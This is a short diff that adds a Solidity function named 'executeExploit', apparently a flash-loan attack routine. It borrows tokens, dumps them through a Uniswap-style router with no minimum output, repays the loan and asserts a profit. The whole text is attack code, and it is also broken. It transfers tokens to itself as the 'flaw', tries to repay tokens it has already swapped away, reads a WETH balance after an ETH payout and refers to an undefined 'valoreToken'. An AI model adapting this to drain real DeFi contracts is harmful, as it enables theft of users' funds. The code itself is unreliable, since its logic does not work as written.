@@ -1,0 +1,40 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Obtain the WETH token to wrap the flashloan amount
+    IWETH weth = IWETH(uniswapRouter.WETH());
+    
+    // Start with the flash loan
+    uint256 borrowedAmount = amount;
+
+    // Execute the flaw when flashed tokens are received
+    valuableToken.transfer(address(this), borrowedAmount);
+    // Perform actions on valuable tokens
+    uint256 valuableTokenAmount = valuableToken.balanceOf(address(this));
+
+    // Swap valuableToken for WETH
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(weth);
+    
+    IUniswapV2Router(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
+        valuableTokenAmount,
+        0, // Accept any amount of WETH
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // After swapping, withdraw the WETH
+    uint256 wethBalance = weth.balanceOf(address(this));
+    weth.withdraw(wethBalance);
+    
+    // Call the flash loan supplier to return the borrowed amount of valuable tokens
+    valuableToken.transfer(flashloanProvider, borrowedAmount);
+    
+    // The surplus balance should be our profit
+    uint256 profit = valoreToken.balanceOf(address(this));
+    assert(profit > 0);
+}
+</executeExploitCode>
+```
